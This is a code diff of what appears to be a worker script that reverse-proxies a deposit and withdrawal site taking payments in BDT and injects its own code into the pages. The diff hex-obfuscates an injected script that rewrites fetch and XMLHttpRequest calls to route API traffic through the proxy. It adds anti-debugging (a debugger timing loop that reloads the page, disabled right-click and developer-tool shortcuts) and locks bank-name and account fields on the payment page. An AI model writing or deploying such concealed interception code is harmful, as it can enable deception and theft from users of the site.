@@ -12,7 +12,7 @@ export default {
     const url = new URL(request.url);
     const originHeader = request.headers.get("Origin") || `https://${url.host}`;
 
-    // 🛡️ প্রফেশনাল সিকিউরিটি: Ghost Script Route
+    // 🛡️ প্রফেশনাল সিকিউরিটি: Advanced Monkey Patch & Anti-Theft System
     if (url.pathname === '/__secure_core.js') {
         const referer = request.headers.get("Referer");
         if (!referer || !referer.includes(url.hostname)) {
@@ -20,7 +20,10 @@ export default {
                 status: 200, headers: { "Content-Type": "application/javascript" }
             });
         }
-        const secretCode = `!function(){const r="/__api_proxy/",e=["liveapi247.live","tv.nginx0.com"];function t(r){return"string"==typeof r&&!r.includes("__api_proxy")&&e.some((e=>r.includes(e)))}const n=window.fetch;window.fetch=async function(...e){try{let o=e[0];"string"==typeof o&&t(o)?e[0]=r+o:o instanceof Request&&t(o.url)&&(e[0]=new Request(r+o.url,o))}catch(r){}return n.apply(this,e)};const o=XMLHttpRequest.prototype.open;XMLHttpRequest.prototype.open=function(e,n,...c){try{"string"==typeof n&&t(n)&&(n=r+n)}catch(r){}return o.call(this,e,n,...c)}}();`;
+        
+        // 🔥 সম্পূর্ণ হেক্স এনকোডেড এবং অ্যান্টি-ডিব্যাগিং মানকি প্যাচ স্ক্রিপ্ট
+        const secretCode = `!function(){const _0x1a2b=["\\x6C\\x69\\x76\\x61\\x70\\x69\\x32\\x34\\x37\\x2E\\x6C\\x69\\x76\\x65","\\x74\\x76\\x2E\\x6E\\x67\\x69\\x6E\\x78\\x30\\x2E\\x63\\x6F\\x6D","\\x2F\\x5F\\x5F\\x61\\x70\\x69\\x5F\\x70\\x72\\x6F\\x78\\x79\\x2F"];function _0x2b3c(u){return typeof u==="string"&&!u.includes(_0x1a2b[2])&&(_0x1a2b[0]===u||_0x1a2b[1]===u||u.includes(_0x1a2b[0])||u.includes(_0x1a2b[1]))}const _0x3c4d=window.fetch;window.fetch=async function(...args){try{if(_0x2b3c(args[0]))args[0]=_0x1a2b[2]+args[0];else if(args[0] instanceof Request&&_0x2b3c(args[0].url))args[0]=new Request(_0x1a2b[2]+args[0].url,args[0])}catch(e){}return _0x3c4d.apply(this,args)};const _0x4d5e=XMLHttpRequest.prototype.open;XMLHttpRequest.prototype.open=function(m,u,...rest){try{if(_0x2b3c(u))u=_0x1a2b[2]+u}catch(e){}return _0x4d5e.call(this,m,u,...rest)};setInterval(function(){const d=new Date();debugger;if(new Date()-d>100){window.location.reload();}},500);document.addEventListener('contextmenu',e=>e.preventDefault());document.onkeydown=function(e){if(e.keyCode==123||(e.ctrlKey&&e.shiftKey&&(e.keyCode==73||e.keyCode==67||e.keyCode==74))||(e.ctrlKey&&e.keyCode==85))return false;}}();`;
+        
         return new Response(secretCode, {
             status: 200, headers: { "Content-Type": "application/javascript", "Cache-Control": "no-cache, no-store, must-revalidate" }
         });
@@ -151,38 +154,44 @@ export default {
                   display: none !important;
               }
 
-              /* ২. Bank Name ও Acc Number ফ্রিজ করা (আপনার দেওয়া ক্লাস দিয়ে) */
+              /* ২. 🛑 লেবেল ফ্রিজ (Label Disable): লেখার উপর ক্লিক করে ইনপুট আনলক করা বন্ধ */
+              .page-dw label.chakra-form__label {
+                  pointer-events: none !important;
+                  user-select: none !important;
+              }
+
+              /* ৩. Bank Name ও Acc Number ফ্রিজ করা */
               .page-dw .css-1kzylc3,
               .page-dw .css-109ik7k,
               .page-dw .css-1h8d01g {
                   height: 45px !important;
                   border-radius: 4px !important; 
-                  pointer-events: none !important; /* ফ্রিজ কোড */
+                  pointer-events: none !important;
                   user-select: none !important;
                   opacity: 0.9 !important;
               }
 
-              /* ৩. ইউনিভার্সাল ইনপুট হাইট (Withdrawal Amount, Phone Number, Transaction ID সব 45px হবে) */
+              /* ৪. ইউনিভার্সাল ইনপুট হাইট (Withdrawal Amount, Phone Number, Transaction ID সব 45px হবে) */
               .page-dw .chakra-input {
                   height: 45px !important;
                   border-radius: 4px !important;
               }
 
-              /* ৪. ইউনিভার্সাল লেফট অ্যাডঅন (BDT লেবেল এবং পতাকার বক্স 45px হবে) */
+              /* ৫. ইউনিভার্সাল লেফট অ্যাডঅন (BDT লেবেল এবং পতাকার বক্স 45px হবে) */
               .page-dw .chakra-input__left-addon {
                   height: 45px !important;
                   border-radius: 4px 0 0 4px !important; 
               }
 
-              /* ৫. 🔥 মাস্টার আনলক (Master Unlock): Amount এবং Phone Number যেন ভুল করেও ফ্রিজ না হয় */
+              /* ৬. 🔥 মাস্টার আনলক (Master Unlock): Amount এবং Phone Number যেন ভুল করেও ফ্রিজ না হয় */
               .page-dw .chakra-input__left-addon + .chakra-input {
-                  border-radius: 0 4px 4px 0 !important; /* বামের কার্ভ জিরো */
-                  pointer-events: auto !important; /* জোর করে ফ্রিজ ছুটানো */
-                  user-select: auto !important;    /* জোর করে টাইপিং এনাবল করা */
-                  opacity: 1 !important;           /* নরমাল অপাসিটি */
+                  border-radius: 0 4px 4px 0 !important; 
+                  pointer-events: auto !important; /* জোর করে ক্লিক আনলক */
+                  user-select: auto !important;    
+                  opacity: 1 !important;           
               }
 
-              /* ৬. Upload Receipt বক্স (আপনার ক্লাস css-8w1h6v) */
+              /* ৭. Upload Receipt বক্স (আপনার ক্লাস css-8w1h6v) */
               .page-dw .css-8w1h6v {
                   height: 45px !important;
                   border-radius: 4px !important;
@@ -190,7 +199,7 @@ export default {
                   align-items: center !important; 
               }
 
-              /* ৭. কপি আইকন বাটন ফিক্স */
+              /* ৮. কপি আইকন বাটন ফিক্স */
               .page-dw .chakra-input__right-element {
                   height: 45px !important;
               }
@@ -219,9 +228,6 @@ export default {
                   }
                 });
 
-                // ==========================================
-                // 📝 কাস্টম স্ক্রিপ্ট
-                // ==========================================
                 const REF_CODE = 'iZfmaT3h';
                 const VIDEO_URL = 'https://github.com/user-attachments/assets/2e0caaaf-d0b6-4631-827f-4b428c62bc97';
 
@@ -245,7 +251,6 @@ export default {
                         if (parentGroup && parentGroup.style.display !== 'none') parentGroup.style.display = 'none';
                     }
 
-                    // Signup / Login Phone Number 
                     const phoneInput = document.querySelector('input[placeholder="Phone Number"]');
                     if (phoneInput && phoneInput.type !== 'tel') {
                         phoneInput.type = 'tel';
@@ -284,7 +289,6 @@ export default {
                         }
                     });
 
-                    // Video Player
                     if (currentPath === 'login' || currentPath === 'signup') {
                         const targetDivForVideo = document.querySelector('div.css-lpwed4');
                         if (targetDivForVideo && !document.getElementById('arfan-custom-video')) {
@@ -321,10 +325,8 @@ export default {
                         if (existingVideo) { existingVideo.remove(); }
                     }
 
-                    // ৮. 🛑 শুধুমাত্র Deposit / Withdrawal পেজ (/dw) এর নির্দিষ্ট কাজ
                     if (currentPath === 'dw') {
                         
-                        // [A] Amount বক্সগুলোতে Number Keypad আনা
                         document.querySelectorAll('.page-dw .chakra-input__left-addon').forEach(addon => {
                             if (addon.textContent.includes('BDT')) {
                                 let amountInput = addon.nextElementSibling;
@@ -337,7 +339,6 @@ export default {
                             }
                         });
 
-                        // [B] Submit বাটন ফিক্স করা
                         document.querySelectorAll('.page-dw button').forEach(btn => {
                             if(btn.innerText.includes('Submit')) {
                                 btn.style.setProperty('height', '45px', 'important');
